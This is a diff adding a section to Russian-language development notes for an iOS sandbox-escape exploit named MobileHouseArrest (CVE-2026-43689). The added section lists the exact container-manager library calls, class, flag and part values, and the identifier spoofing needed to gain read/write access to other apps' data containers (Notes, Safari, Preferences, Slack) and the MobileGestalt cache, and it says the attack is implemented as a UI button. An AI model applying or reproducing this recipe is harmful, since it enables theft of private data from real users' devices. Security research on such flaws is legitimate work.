@@ -2266,3 +2266,46 @@ house_arrest: {"Command":"VendContainer","Identifier":"<чужой bundle id>",
 контейнера жертвы и sandbox extension. Формат сообщения берём из PoC
 (github.com/nepcukk/Darkgram).
 
+8.66 ПОЛНЫЙ PoC MobileHouseArrest (CVE-2026-43689) - РЕАЛИЗОВАНО
+
+Найден PoC johnny: github.com/0xjohnnydev/MobileHouseArrest-PoC (poc.m).
+КЛЮЧЕВАЯ ДЕТАЛЬ, КОТОРОЙ НЕ БЫЛО В СТАТЬЕ:
+  "Build this file in an iOS app whose CodeDirectory identifier is exactly:
+       com.apple.mobile.MobileHouseArrest"
+То есть ключ авторизации в MCM - это НЕ bundle id жертвы, а ИМЯ
+ENTITLEMENT'А. Значит наш CodeDirectory identifier должен быть
+com.apple.mobile.MobileHouseArrest, а жертва задаётся отдельно, в поле
+ids запроса.
+
+Вся атака - вызовы клиентской библиотеки /usr/lib/system/
+libsystem_containermanager.dylib (она внутри песочницы приложения):
+  container_query_create()
+  container_query_set_class(q, 2)                      // данные приложения
+  container_query_set_identifiers(q, xpc_string)        // bundle id ЖЕРТВЫ
+  container_query_operation_set_flags(q, 0x900000000)   // R/W
+  container_query_operation_set_part(q, 0)
+  container_query_get_single_result(q) -> object
+  container_object_get_path(object)      -> путь контейнера
+  container_copy_sandbox_token(object)   -> токен extension'а
+  container_object_sandbox_extension_activate(object, false) -> доступ
+
+Вариант class 13: container_query_set_group_identifiers(q,
+"systemgroup.com.apple.mobilegestaltcache"), flags 0x8100000000,
+part 3 (Library/Caches) => R/W живого com.apple.MobileGestalt.plist.
+
+РЕАЛИЗОВАНО: Sources/Legacy/mha_attack.c, кнопка "MHA attack (container
+escape)", лог Documents/mha.log:
+  - жертвы: com.apple.mobilenotes, com.apple.mobilesafari,
+    com.apple.Preferences, com.apple.mobileslack;
+  - для каждой: путь контейнера, наличие токена, activate, читаемость
+    Documents ДО/ПОСЛЕ activate, листинг файлов жертвы при успехе;
+  - class 13: путь, токен, writable MG-plist до/после.
+Указатель не нужен, баг ядра не нужен - только подпись.
+
+ПОДПИСЬ (обязательна): SPOOF_ID=com.apple.mobile.MobileHouseArrest
+  => [IPA] CFBundleIdentifier: com.dj.srk801 -> com.apple.mobile.MobileHouseArrest
+  => [IPA] entitlements ПОДТВЕРЖДЕНЫ в бинарнике
+
+КНОПКИ: оставлена одна атакующая ("MHA attack") + WebKit пивот + служебные
+(run/slideOnly) убраны из UI.
+
